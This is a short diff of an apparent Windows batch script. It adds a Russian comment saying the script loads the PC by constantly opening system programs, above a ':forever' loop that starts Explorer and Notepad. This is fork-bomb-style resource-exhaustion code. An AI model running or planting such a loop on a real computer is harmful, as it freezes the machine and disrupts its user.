@@ -1,3 +1,4 @@
+:: (Нагрузка на ПК постоянным открытием системных программ)
 :forever
 start explorer
 start notepad
